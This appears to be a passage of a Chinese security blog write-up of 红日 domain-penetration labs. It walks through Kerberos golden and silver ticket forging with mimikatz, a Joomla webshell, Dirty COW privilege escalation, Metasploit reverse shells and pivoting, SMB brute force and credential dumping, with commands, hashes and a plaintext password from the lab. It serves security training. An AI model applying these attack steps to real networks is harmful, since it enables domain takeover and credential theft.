+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">shell <span class="hljs-built_in">dir</span> \\DC\C<span class="hljs-variable">$</span>   //DC是域控主机名字，C<span class="hljs-variable">$</span>是windows系统默认管理共享文档<br></code></pre></td></tr></table></figure>
+
+<p>生成票据</p>
+<p><img src="/img/photo/image-20260108195217598.png" srcset="/img/loading.gif" lazyload alt="image-20260108195217598"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mimikatz</span> kerberos::golden /user:zhuo /domain:de1ay.com /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">2756371121</span>-<span class="hljs-number">2868759905</span>-<span class="hljs-number">3853650604</span> /krbtgt:<span class="hljs-number">82</span>dfc71b72a11ef37d663047bc2088fb /endin:<span class="hljs-number">480</span> /renewmax:<span class="hljs-number">10080</span> /ptt<br></code></pre></td></tr></table></figure>
+
+<p>列出当前会话中的票据</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz kerberos::list<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/photo/image-20260108195510367.png" srcset="/img/loading.gif" lazyload alt="image-20260108195510367"></p>
+<p>再次查看域权限，cifs和ldap是同时可用的</p>
+<p><img src="/img/photo/image-20260108205701893.png" srcset="/img/loading.gif" lazyload alt="image-20260108205701893"></p>
+<p><strong>白银票据</strong></p>
+<p>检查cifs域权限，是失败的，</p>
+<p><img src="/img/photo/image-20260108203542398.png" srcset="/img/loading.gif" lazyload alt="image-20260108203542398"></p>
+<p>制作白银票据，访问cifs服务</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mimikatz</span> kerberos::golden /user:zhup /domain:de1ay.com /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">2756371121</span>-<span class="hljs-number">2868759905</span>-<span class="hljs-number">3853650604</span> /target:dc.de1ay.com /service:cifs /rc4:<span class="hljs-number">89</span>b05b05feb5088ac2bbd703cd161850 /ptt<br></code></pre></td></tr></table></figure>
+
+<p>与黄金票据的区别就是多了具体的目标target用于确定服务，hash用的自己用户的hash</p>
+<p>可以看到可以访问cifs服务，但是无法访问ldap服务</p>
+<p><img src="/img/photo/image-20260108205312247.png" srcset="/img/loading.gif" lazyload alt="image-20260108205312247"></p>
+<p>接下来伪造ldap服务</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mimikatz</span> kerberos::golden /user:zhup /domain:de1ay.com /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">2756371121</span>-<span class="hljs-number">2868759905</span>-<span class="hljs-number">3853650604</span> /target:dc.de1ay.com /service:ldap /rc4:<span class="hljs-number">89</span>b05b05feb5088ac2bbd703cd161850 /ptt<br></code></pre></td></tr></table></figure>
+
+<p>可以看到可以抓取到krbtgt的hash，cifs服务用不了了</p>
+<p><img src="/img/photo/image-20260108205441114.png" srcset="/img/loading.gif" lazyload alt="image-20260108205441114"></p>
+<p><img src="/img/photo/image-20260108205532035.png" srcset="/img/loading.gif" lazyload alt="image-20260108205532035"></p>
+<p>可以伪造的服务如下</p>
+<p><img src="/img/photo/1650385435_625ee21ba824ce28c4965.jpeg" srcset="/img/loading.gif" lazyload></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>&#x2F;&#x2F;CS中监听器的区别与选择</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">beacon <span class="hljs-keyword">http</span>/<span class="hljs-keyword">https</span>  <span class="hljs-comment"> //目标主动向CS服务器发送http请求</span><br>beacon dns  <span class="hljs-comment"> //目标通过DNS查询请求向CS服务器传输数据</span><br>beacon smb  <span class="hljs-comment"> //文件共享协议，内网横向专用</span><br>beacon tcp <span class="hljs-comment"> //原始tcp连接</span><br></code></pre></td></tr></table></figure>
+
+<p>白银票据和黄金票据的区别</p>
+<p>白银票据伪造的是获取服务的权限，黄金票据伪造的是域管理员的权限</p>
+<h3 id="红日靶场（三）"><a href="#红日靶场（三）" class="headerlink" title="红日靶场（三）"></a>红日靶场（三）</h3><p>扫描本机网段</p>
+<p><img src="/img/photo/image-20251129203744744.png" srcset="/img/loading.gif" lazyload alt="image-20251129203744744"></p>
+<p>发现有主机80端口开放</p>
+<p>访问，有登录接口</p>
+<p><img src="/img/photo/image-20251129204901965.png" srcset="/img/loading.gif" lazyload alt="image-20251129204901965"></p>
+<p>扫描一下目录，configuration.php文件泄露配置信息，有数据库密码</p>
+<p><img src="/img/photo/image-20251129204109284.png" srcset="/img/loading.gif" lazyload alt="image-20251129204109284"></p>
+<p>远程链接数据库</p>
+<p><img src="/img/photo/image-20251129204207702.png" srcset="/img/loading.gif" lazyload alt="image-20251129204207702"></p>
+<p>在joomla官方文档中找到了修改密码的操作</p>
+<p><img src="/img/photo/2176750-20250325153339802-26202534.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>添加了一个账户admin2:secret,成功登录</p>
+<p><img src="/img/photo/image-20251129204925438.png" srcset="/img/loading.gif" lazyload alt="image-20251129204925438"></p>
+<p>网站存在beez3模板，可以直接插入一句话木马</p>
+<p><img src="/img/photo/image-20251129205010646.png" srcset="/img/loading.gif" lazyload alt="image-20251129205010646"></p>
+<p><img src="/img/photo/image-20251129205125491.png" srcset="/img/loading.gif" lazyload alt="image-20251129205125491"></p>
+<p>蚁剑链接成功</p>
+<p><img src="/img/photo/image-20251129205428059.png" srcset="/img/loading.gif" lazyload alt="image-20251129205428059"></p>
+<p>发现虚拟终端无法执行命令</p>
+<p><img src="/img/photo/image-20251129205459569.png" srcset="/img/loading.gif" lazyload alt="image-20251129205459569"></p>
+<p>目录扫描中，有phpinfo泄露，可以看到启用了disable_function</p>
+<p><img src="/img/photo/image-20251129205610372.png" srcset="/img/loading.gif" lazyload alt="image-20251129205610372"></p>
+<p>尝试用蚁剑的disable_function插件绕过，这里使用user_filter成功绕过</p>
+<p><img src="/img/photo/image-20251129205745049.png" srcset="/img/loading.gif" lazyload alt="image-20251129205745049"></p>
+<p>在目录下面翻到了一对账密，站点开启了ssh服务，猜测应该是ssh的账密</p>
+<p><img src="/img/photo/image-20251129205835668.png" srcset="/img/loading.gif" lazyload alt="image-20251129205835668"></p>
+<p>使用ssh登录，登录成功</p>
+<p><img src="/img/photo/image-20251129205949770.png" srcset="/img/loading.gif" lazyload alt="image-20251129205949770"></p>
+<p>开始信息收集，可以机器有两个网段，可以判定存在内网</p>
+<p><img src="/img/photo/image-20251129210346702.png" srcset="/img/loading.gif" lazyload alt="image-20251129210346702"></p>
+<p>并且这个linux的内核版本存在漏洞，可以用脏牛提权</p>
+<p>准备脏牛文件，上传到目标机器，并提权</p>
+<p><img src="/img/photo/image-20251129211332104.png" srcset="/img/loading.gif" lazyload alt="image-20251129211332104"></p>
+<p>提权成功，成功创建了一个toor的root账户</p>
+<p><img src="/img/photo/image-20251129211715577.png" srcset="/img/loading.gif" lazyload alt="image-20251129211715577"></p>
+<p>使用msf创建一个linux的木马</p>
+<p><img src="/img/photo/image-20251129211913138.png" srcset="/img/loading.gif" lazyload alt="image-20251129211913138"></p>
+<p>msf使用exploit&#x2F;multi&#x2F;handler监听，成功反弹shell</p>
+<p><img src="/img/photo/image-20251129212319700.png" srcset="/img/loading.gif" lazyload alt="image-20251129212319700"></p>
+<p>查看路由</p>
+<p><img src="/img/photo/image-20251129212455872.png" srcset="/img/loading.gif" lazyload alt="image-20251129212455872"></p>
+<p>用autoroute模块以此会话添加一个到93网段的路由，方便测试</p>
+<p><img src="/img/photo/image-20251129213951368.png" srcset="/img/loading.gif" lazyload alt="image-20251129213951368"></p>
+<p>使用uxiliary&#x2F;server&#x2F;socks_proxy，把会话代理出去</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">use auxiliary/server/socks_proxy<br><span class="hljs-keyword">set</span> srvport <span class="hljs-comment">6677</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">version 4a</span><br></code></pre></td></tr></table></figure>
+
+<p>使用auxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_probe模块模块，扫一下内网存活的主机</p>
+<p>发现三台主机</p>
+<p><img src="/img/photo/image-20251129214125966.png" srcset="/img/loading.gif" lazyload alt="image-20251129214125966"></p>
+<p>使用auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp进行端口扫描</p>
+<p><img src="/img/photo/image-20251129214452171.png" srcset="/img/loading.gif" lazyload alt="image-20251129214452171"></p>
+<p><img src="/img/photo/image-20251129214553566.png" srcset="/img/loading.gif" lazyload alt="image-20251129214553566"></p>
+<p><img src="/img/photo/image-20251129214916547.png" srcset="/img/loading.gif" lazyload alt="image-20251129214916547"></p>
+<p>发现所有机器都开启了445端口</p>
+<p>先尝试扫描是否有永恒之蓝漏洞，发现都没有</p>
+<p><img src="/img/photo/image-20251129215036794.png" srcset="/img/loading.gif" lazyload alt="image-20251129215036794"></p>
+<p>尝试smb爆破，成功爆破出密码</p>
+<p><img src="/img/photo/image-20251129215303580.png" srcset="/img/loading.gif" lazyload alt="image-20251129215303580"></p>
+<p>使用psexec成功链接</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/photo/image-20251129215720222.png" srcset="/img/loading.gif" lazyload alt="image-20251129215720222"></p>
+<p>以同样的方式获取其他两台机器，只成功了一台，有一台失败了</p>
+<p>使用mimikatz抓取密码</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">kiwi_cmd sekurlsa::logonPasswords<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/photo/image-20251129221333095.png" srcset="/img/loading.gif" lazyload alt="image-20251129221333095"></p>
+<p>抓取到明文密码为zxcASDqw123!!</p>
+<p><img src="/img/photo/image-20251129221430429.png" srcset="/img/loading.gif" lazyload alt="image-20251129221430429"></p>
+<p>尝试用psexsc链接失败了</p>
+<p>尝试用wmiexec链接成功</p>
+<p><img src="/img/photo/image-20251129224356389.png" srcset="/img/loading.gif" lazyload alt="image-20251129224356389"></p>
+<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>psexec：一个轻量级远程执行工具，在目标机器启动psexecsvc服务，把命令回显到客户端，需要对方开启admin$共享，会留痕</p>
+<p>wmiexec：基于WMI接口实现远程命令执行，依赖445、135等端口，隐蔽性强，但速度较慢</p>
+<p>msf常用模块</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">uxiliary<span class="hljs-regexp">/server/</span>socks_proxy  <span class="hljs-comment">#代理会话</span><br>auxiliary<span class="hljs-regexp">/scanner/</span>portscan/tcp <span class="hljs-comment">#端口扫描</span><br>run auto -s 目的网段 <span class="hljs-comment">#挂路由</span><br>auxiliary<span class="hljs-regexp">/scanner/</span>discovery/udp_probe <span class="hljs-comment">#主机探测</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/web%E5%AE%89%E5%85%A8/" class="category-chain-item">web安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" class="print-no-link">#域渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>域渗透基础</div>
+      <div>http://example.com/2025/09/14/域渗透基础/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>清风</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年9月14日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/10/04/JAVA-web-API/" title="JAVA-web-API">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">JAVA-web-API</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/09/13/ARM%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/" title="ARM汇编基础">
+                        <span class="hidden-mobile">ARM汇编基础</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"0JWcKtnJwUWPWRrrdTax0lya-gzGzoHsz","appKey":"Q6KrvNK2N7nNsewpWYVdjHuI","path":"window.location.pathname","placeholder":"说点什么","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+<script src="/js/codeType.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
